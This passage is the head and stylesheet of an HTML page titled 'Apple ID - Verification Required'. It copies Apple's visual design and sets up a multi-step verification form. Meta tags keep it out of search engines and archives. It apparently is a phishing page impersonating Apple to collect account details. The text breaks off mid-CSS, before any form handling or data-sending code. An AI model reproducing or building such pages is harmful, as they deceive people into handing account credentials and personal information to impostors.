<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, noarchive">
    <meta name="googlebot-news" content="nosnippet">
    <meta name="description" content="Verify your Apple ID information">
    <title>Apple ID - Verification Required</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
        }
        
        :root {
            --apple-primary: #1d1d1f;
            --apple-secondary: #f5f5f7;
            --apple-blue: #0071e3;
            --apple-blue-dark: #0058b0;
            --apple-grey: #86868b;
            --apple-light-grey: #d2d2d7;
            --apple-success: #4cd964;
            --apple-error: #ff3b30;
        }
        
        body {
            background-color: var(--apple-secondary);
            color: var(--apple-primary);
            line-height: 1.47059;
            font-weight: 400;
            letter-spacing: -0.022em;
        }
        
        .container {
            max-width: 980px;
            margin: 0 auto;
            padding: 0 22px;
        }
        
        .header {
            text-align: center;
            padding: 40px 0 24px;
            background-color: var(--apple-secondary);
            margin-bottom: 30px;
        }
        
        .logo {
            width: 36px;
            height: 44px;
            margin-bottom: 25px;
        }
        
        h1 {
            font-size: 40px;
            line-height: 1.1;
            font-weight: 600;
            letter-spacing: 0;
            margin-bottom: 5px;
        }
        
        h2 {
            font-size: 28px;
            line-height: 1.2;
            font-weight: 600;
            letter-spacing: 0.007em;
            margin-bottom: 14px;
        }
        
        .subtitle {
            font-size: 17px;
            color: var(--apple-grey);
            max-width: 600px;
            margin: 0 auto;
        }
        
        .global-nav {
            background-color: rgba(0, 0, 0, 0.8);
            backdrop-filter: saturate(180%) blur(20px);
            height: 44px;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            position: sticky;
            top: 0;
            z-index: 9999;
        }
        
        .global-nav ul {
            display: flex;
            list-style: none;
            max-width: 980px;
            width: 100%;
            justify-content: space-around;
            padding: 0 10px;
        }
        
        .global-nav a {
            color: rgba(255, 255, 255, 0.8);
            text-decoration: none;
            font-size: 12px;
            transition: color 0.2s;
        }
        
        .global-nav a:hover {
            color: #ffffff;
        }
        
        .card {
            background-color: #fff;
            border-radius: 18px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
            padding: 35px;
            margin-bottom: 35px;
            max-width: 780px;
            margin-left: auto;
            margin-right: auto;
        }
        
        .info-text {
            margin-bottom: 30px;
            color: var(--apple-primary);
            font-size: 17px;
            line-height: 1.47059;
        }
        
        .progress-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 40px;
            max-width: 520px;
            margin-left: auto;
            margin-right: auto;
        }
        
        .step {
            flex: 1;
            text-align: center;
            position: relative;
        }
        
        .step::after {
            content: '';
            position: absolute;
            top: 15px;
            left: 50%;
            width: 100%;
            height: 2px;
            background-color: var(--apple-light-grey);
            z-index: 1;
        }
        
        .step:last-child::after {
            display: none;
        }
        
        .step-number {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background-color: var(--apple-light-grey);
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 10px;
            position: relative;
            z-index: 2;
            font-size: 14px;
            font-weight: 600;
        }
        
        .step.active .step-number {
            background-color: var(--apple-blue);
        }
        
        .step.completed .step-number {
            background-color: var(--apple-success);
        }
        
        .step-label {
            font-size: 14px;
            color: var(--apple-grey);
        }
        
        .step.active .step-label {
            color: var(--apple-blue);
            font-weight: 500;
        }
        
        .form-section {
            display: none;
        }
        
        .form-section.active {
            display: block;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 400;
            font-size: 17px;
            line-height: 1.23536;
            letter-spacing: -0.022em;
        }
        
        input, select {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid var(--apple-light-grey);
            border-radius: 12px;
            font-size: 17px;
            line-height: 1.23536;
            outline: none;
            transition: border-color 0.2s ease;
            -webkit-appearance: none;
            background-color: hsla(0,0%,100%,.8);
        }
        
        input:focus, select:focus {
            border-color: var(--apple-blue);
            box-shadow: 0 0 0 4px rgba(0, 125, 250, 0.1);
        }
        
        select {
            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%236e6e73' viewBox='0 0 16 16'><path d='M7.247 11.14 2
